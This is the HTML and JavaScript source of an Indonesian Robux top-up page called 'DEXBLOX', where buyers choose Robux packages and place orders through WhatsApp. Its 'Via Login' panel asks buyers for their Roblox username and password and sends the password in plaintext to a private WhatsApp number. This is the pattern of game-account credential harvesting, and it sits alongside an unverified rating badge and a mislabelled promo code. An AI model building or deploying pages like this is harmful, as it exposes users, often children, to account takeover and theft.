<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>DEXBLOX</title>
  <style>
    body{font-family:Arial,sans-serif;margin:0;padding:0;background:#f9f9f9;color:#333}
    .container{width:100%;min-height:100vh;display:flex;flex-direction:column}
    h1{text-align:center;background:linear-gradient(135deg,#0077cc,#00ffaa);
       -webkit-background-clip:text;-webkit-text-fill-color:transparent;
       font-weight:bold;font-size:clamp(2rem,6vw,3rem);margin:30px 0 12px}
    .rating{text-align:center;margin-bottom:20px;font-size:14px;color:#555}
    .panel-buttons{display:flex;gap:10px;margin:0 20px 20px}
    .panel-buttons button{flex:1;padding:10px;border:none;border-radius:8px;
       background:#0077cc;color:#fff;font-weight:bold;cursor:pointer;font-size:13px}
    .panel-buttons button.active{background:linear-gradient(135deg,#00aa55,#00ffaa);
       box-shadow:0 0 8px rgba(0,255,170,.6)}
    .form-section{display:none;padding:15px;border-top:1px solid #ddd;background:#fff;
       border-radius:8px;margin:0 20px 20px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
    .form-section.active{display:block}
    form{max-width:320px;margin:auto}
    form label{display:block;margin-top:10px;font-size:12px;font-weight:bold;color:#444}
    form input{width:100%;padding:8px;margin-top:4px;border-radius:6px;border:1px solid #ccc;font-size:12px}
    #notifHarga{margin-top:8px;font-size:12px;color:#0077cc;text-align:center}
    button.submit{margin-top:15px;width:100%;padding:10px;border:none;border-radius:8px;
       background:#0077cc;color:#fff;font-weight:bold;cursor:pointer;font-size:13px}
    button.submit:disabled{background:#aaa;cursor:not-allowed}
    .paket-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
    .deal{padding:10px;border:none;border-radius:6px;background:#eee;cursor:pointer;
       text-align:center;font-size:12px}
    .deal.active{background:#00aa55;color:#fff;box-shadow:0 0 6px rgba(0,170,85,.6)}
    .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;
       background:rgba(0,0,0,.6);align-items:center;justify-content:center;z-index:50}
    .modal-content{background:#fff;padding:15px;border-radius:12px;max-width:320px;
       text-align:center;box-shadow:0 0 20px rgba(0,0,0,.3)}
    footer{text-align:center;font-size:11px;color:#555;margin:15px}
    #avatarPreview,#adminAvatar{display:none;margin:10px auto;border-radius:50%;
       border:2px solid #00ffaa;width:80px;height:80px}
  </style>
</head>
<body>
  <div class="container">
    <h1>DEXBLOX</h1>
    <div class="rating">—Ç–Ω–† 9.3 Rating | Total 10.000+ | Top Rank</div>
    <div class="panel-buttons">
      <button id="btn5hari" class="active">Robux 5 Hari</button>
      <button id="btnLangsung">Via Login</button>
      <button id="btnKomunitas">Via Komunitas</button>
    </div>

    <!-- Panel Robux 5 Hari -->
    <div id="form5hari" class="form-section active">
      <form id="topupForm5">
        <label>Username</label>
        <input type="text" id="username5" placeholder="Masukkan Username">
        <button type="button" id="btnCekUser">Cek Username</button>
        <p id="notifUsername" style="font-size:11px;color:red"></p>
        <img id="avatarPreview" alt="Avatar Roblox">
        <label>Jumlah Robux</label>
        <input type="number" id="jumlah5" placeholder="Masukkan Jumlah Rbx">
        <div id="notifHarga">Harga hari ini: -</div>
        <label>Kode Promo</label>
        <input type="text" id="promoInput" placeholder="Masukkan kode promo">
        <p id="notifPromo" style="font-size:11px;color:red"></p>
        <button type="submit" class="submit" id="btnTopup" disabled>Topup Sekarang</button>
      </form>
      <div class="paket-grid">
        <button class="deal" data-rbx="100" data-harga="12300">100 Robux<br>Rp12.300</button>
        <button class="deal" data-rbx="200" data-harga="24600">200 Robux<br>Rp24.600</button>
      </div>
    </div>

    <!-- Panel Via Login -->
    <div id="formLangsung" class="form-section">
      <form id="topupFormLangsung">
        <label>Username</label><input type="text" id="usernameL">
        <label>Password</label><input type="password" id="passwordL">
        <div class="paket-grid">
          <button class="deal" data-paket="450 Robux" data-harga="72500">450 Robux<br>Rp72.500</button>
          <button class="deal" data-paket="1000 Robux" data-harga="145000">1000 Robux<br>Rp145.000</button>
        </div>
        <button type="submit" class="submit" disabled>Lanjutkan ke WhatsApp</button>
      </form>
    </div>

    <!-- Panel Via Komunitas -->
    <div id="formKomunitas" class="form-section">
      <p style="font-size:12px;text-align:center;color:#555">Fitur Via Komunitas akan segera hadir.</p>
    </div>
  </div>

  <!-- Modal Konfirmasi -->
  <div id="confirmModal" class="modal">
    <div class="modal-content">
      <h3>Konfirmasi Data</h3>
      <p id="modalText"></p>
      <button id="confirmYes">Lanjutkan ke WhatsApp</button>
      <button id="confirmNo">Batal</button>
    </div>
  </div>

  <!-- Admin Panel -->
  <div style="position:fixed;bottom:10px;right:10px">
    <button id="adminToggleBtn">‚öôÔ∏è Admin</button>
  </div>
  <div id="adminModal" class="modal">
    <div class="modal-content">
      <h3>Admin Konfirmasi</h3>
      <label>Username User</label><input type="text" id="adminUser"><br>
      <button id="btnAdminCekUser">Cek Username</button>
      <p id="adminNotifUser"></p>
      <img id="adminAvatar">
      <button id="btnCloseAdmin">Tutup</button>
    </div>
  </div>

  <!-- Footer -->
  <footer>¬© <span id="fullDate"></span> DEXBLOX All Rights Reserved</footer>

<script>
let userProfileUrl="", gameUrl="https://www.roblox.com/id/games/123565133175965";

// Toggle panels
btn5hari.onclick=()=>{btn5hari.classList.add("active");btnLangsung.classList.remove("active");btnKomunitas.classList.remove("active");form5hari.classList.add("active");formLangsung.classList.remove("active");formKomunitas.classList.remove("active");};
btnLangsung.onclick=()=>{btnLangsung.classList.add("active");btn5hari.classList.remove("active");btnKomunitas.classList.remove("active");formLangsung.classList.add("active");form5hari.classList.remove("active");formKomunitas.classList.remove("active");};
btnKomunitas.onclick=()=>{btnKomunitas.classList.add("active");btn5hari.classList.remove("active");btnLangsung.classList.remove("active");formKomunitas.classList.add("active");form5hari.classList.remove("active");formLangsung.classList.remove("active");};

// Paket Robux 5 Hari
document.querySelectorAll("#form5hari .deal").forEach(btn=>{
  btn.onclick=()=>{
    document.querySelectorAll("#form5hari .deal").forEach(b=>b.classList.remove("active"));
    btn.classList.add("active");
    document.getElementById("jumlah5").value=btn.dataset.rbx;
    const gamepassId=Math.round((btn.dataset.rbx/100)*143);
    document.getElementById("notifHarga").textContent=
      `Harga hari ini: ${btn.dataset.rbx} Robux = Rp${parseInt(btn.dataset.harga).toLocaleString()} (Gamepass: ${gamepassId})`;
    cekValidasi();
  };
});

// Promo Validation
document.getElementById("promoInput").addEventListener("input",()=>{
  const val=document.getElementById("promoInput").value.trim().toUpperCase();
  if(val==="DEX10OFF"){
    document.getElementById("notifPromo").textContent="Kode promo valid! Diskon 4% aktif.";
    document.getElementById("notifPromo").style.color="green";
  } else {
    document.getElementById("notifPromo").textContent="Kode promo salah.";
    document.getElementById("notifPromo").style.color="red";
  }
});

// Validasi form Robux 5 Hari
function cekValidasi(){
  let u=document.getElementById("username5").value.trim();
  let j=document.getElementById("jumlah5").value;
  document.getElementById("btnTopup").disabled=!(u!==""&&j>0);
}
document.getElementById("username5").addEventListener("input", cekValidasi);

// Modal konfirmasi
function showModal(pesan,url){
  document.getElementById("modalText").innerText=pesan;
  document.getElementById("confirmModal").style.display="flex";
  document.getElementById("confirmYes").onclick=()=>{
    document.getElementById("confirmModal").style.display="none";
    window.open(url,"_blank");
  };
  document.getElementById("confirmNo").onclick=()=>{
    document.getElementById("confirmModal").style.display="none";
  };
}

// Cek Username User via API user.js + avatar.js
document.getElementById("btnCekUser").onclick=async ()=>{
  const u=document.getElementById("username5").value.trim();
  if(!u){document.getElementById("notifUsername").textContent="Harap isi Username!";return;}
  try{
    const resUser=await fetch("/api/user",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
    const dataUser=await resUser.json();
    if(resUser.ok){
      document.getElementById("notifUsername").textContent="Username ditemukan: "+dataUser.name;
      document.getElementById("notifUsername").style.color="green";
      userProfileUrl=dataUser.profileUrl;
      const resAvatar=await fetch(`/api/avatar?userId=${dataUser.userId}`);
      const dataAvatar=await resAvatar.json();
      if(resAvatar.ok){
        document.getElementById("avatarPreview").src=dataAvatar.avatarUrl;
        document.getElementById("avatarPreview").style.display="block";
      }
    } else {
      document.getElementById("notifUsername").textContent=dataUser.error;
    }
  }catch(err){
    document.getElementById("notifUsername").textContent="Gagal cek username.";
  }
};

// Submit Robux 5 Hari
document.getElementById("topupForm5").onsubmit=e=>{
  e.preventDefault();
  let u=document.getElementById("username5").value.trim(),
      j=document.getElementById("jumlah5").value,
      notif=document.getElementById("notifHarga").textContent;
  let promo=document.getElementById("promoInput").value.trim();
  let pesan=`Halo Admin, saya ingin topup Robux 5 Hari:
üë§ Username: ${u}
üéÆ Jumlah: ${j}
${notif}
üåê Profil: ${userProfileUrl}
üé≤ Game: ${gameUrl}
${promo?`üéü Promo: ${promo}`:""}`;
  let url=`https://wa.me/6285362187740?text=${encodeURIComponent(pesan)}`;
  showModal(pesan,url);
};

// Paket Via Login
document.querySelectorAll("#formLangsung .deal").forEach(btn=>{
  btn.onclick=()=>{
    document.querySelectorAll("#formLangsung .deal").forEach(b=>b.classList.remove("active"));
    btn.classList.add("active");
  };
});

// Submit Via Login
document.getElementById("topupFormLangsung").onsubmit=e=>{
  e.preventDefault();
  let u=document.getElementById("usernameL").value.trim(),
      p=document.getElementById("passwordL").value;
  let paketBtn=document.querySelector("#formLangsung .deal.active");
  let paket=paketBtn?paketBtn.dataset.paket:"Belum pilih paket",
      harga=paketBtn?"Rp"+paketBtn.dataset.harga:"-";
  let pesan=`Halo Admin, saya ingin topup Robux Via Login:
üë§ Username: ${u}
üîë Password: ${p}
üéÆ Paket: ${paket}
üí∞ Harga: ${harga}
üåê Profil: https://www.roblox.com/users/${u}/profile
üé≤ Game: ${gameUrl}`;
  let url=`https://wa.me/6285362187740?text=${encodeURIComponent(pesan)}`;
  showModal(pesan,url);
};

// Admin Panel hanya konfirmasi
document.getElementById("adminToggleBtn").onclick=()=>{document.getElementById("adminModal").style.display="flex";};
document.getElementById("btnCloseAdmin").onclick=()=>{document.getElementById("adminModal").style.display="none";};
document.getElementById("btnAdminCekUser").onclick=async ()=>{
  const u=document.getElementById("adminUser").value.trim();
  if(!u){document.getElementById("adminNotifUser").textContent="Harap isi Username!";return;}
  try{
    const resUser=await fetch("/api/user",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
    const dataUser=await resUser.json();
    if(resUser.ok){
      document.getElementById("adminNotifUser").textContent="Username ditemukan: "+dataUser.name;
      document.getElementById("adminNotifUser").style.color="green";
      const resAvatar=await fetch(`/api/avatar?userId=${dataUser.userId}`);
      const dataAvatar=await resAvatar.json();
      if(resAvatar.ok){
        document.getElementById("adminAvatar").src=dataAvatar.avatarUrl;
        document.getElementById("adminAvatar").style.display="block";
      }
    } else {
      document.getElementById("adminNotifUser").textContent=dataUser.error;
    }
  }catch(err){
    document.getElementById("adminNotifUser").textContent="Gagal cek username.";
  }
};

// Footer date
const today=new Date();
document.getElementById("fullDate").textContent=today.toLocaleDateString("id-ID",{day:"numeric",month:"long",year:"numeric"});
</script>
</body>
</html>
